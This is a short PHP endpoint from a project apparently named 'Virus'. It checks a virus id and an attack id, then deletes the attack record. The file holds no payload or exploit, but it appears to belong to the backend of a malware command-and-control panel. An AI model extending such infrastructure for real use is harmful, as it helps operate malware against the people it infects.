<?php

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Authenticator;
use Kelvinho\Virus\Controller\Helper;
use Kelvinho\Virus\Header;

require_once(__DIR__ . "/../autoload.php");

Helper::verifyIds($_POST["virus_id"], $_POST["attack_id"]);
$virus_id = $_POST["virus_id"];
$attack_id = $_POST["attack_id"];

if (!Authenticator::authorized($virus_id, $attack_id)) {
    Header::forbidden();
} else {
    $_SESSION["virus_id"] = $virus_id;
    $attack = AttackInterface::get($attack_id);
    $attack->delete();
    Header::ok();
}